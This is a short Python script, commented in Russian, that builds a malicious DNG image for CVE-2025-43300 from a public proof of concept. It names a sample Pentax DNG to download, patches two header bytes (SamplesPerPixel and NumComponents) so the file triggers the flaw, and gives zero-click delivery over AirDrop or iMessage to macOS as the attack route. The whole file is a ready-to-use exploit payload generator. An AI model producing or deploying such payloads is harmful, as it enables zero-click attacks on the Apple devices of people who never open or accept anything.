#!/usr/bin/env python3
"""make_dng_payload.py — готовит DNG-payload для CVE-2025-43300 (Вектор Б).

По PoC b1n4r1b01:
  1. Скачать DNG: https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346
     (Pentax K-3 Mark III, JPEG Lossless внутри)
  2. Patch 2 байта:
       0x2FD00: 01 -> 02   (SamplesPerPixel в SubIFD)
       0x3E40B: 02 -> 01   (NumComponents в SOF3)
  3. Delivery: Airdrop / iMessage (0-click)

Использование:
  python3 make_dng_payload.py input.dng output.dng
  python3 make_dng_payload.py input.dng output.dng --verify   # проверка байтов
  python3 make_dng_payload.py input.dng output.dng --revert   # вернуть оригинал
"""
import argparse, sys

PATCHES = [
    # (offset, pre, post)
    (0x2FD00, 0x01, 0x02),   # SamplesPerPixel (SubIFD TIFF)
    (0x3E40B, 0x02, 0x01),   # NumComponents (SOF3)
]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("input")
    ap.add_argument("output")
    ap.add_argument("--verify", action="store_true", help="только проверка байтов")
    ap.add_argument("--revert", action="store_true", help="вернуть pre-patch значения")
    args = ap.parse_args()

    data = bytearray(open(args.input, "rb").read())
    print(f"[dng] input: {args.input} ({len(data)} bytes)")

    for off, pre, post in PATCHES:
        cur = data[off]
        want = pre if args.revert else post
        if args.verify:
            ok = (cur == post)
            print(f"[dng] {off:#x}: {cur:#04x} {'OK (patched)' if ok else 'NOT patched (want %02x)' % post}")
            if not ok and not args.revert:
                sys.exit(1)
            continue
        if cur == want:
            print(f"[dng] {off:#x}: already {cur:#04x}")
        else:
            print(f"[dng] {off:#x}: {cur:#04x} -> {want:#04x}")
            data[off] = want

    if not args.verify:
        open(args.output, "wb").write(data)
        print(f"[dng] output: {args.output} ({len(data)} bytes)")
        print("[dng] delivery: Airdrop / iMessage (0-click) -> macOS 15.6 DNGViewer (crash oracle)")

if __name__ == "__main__":
    main()
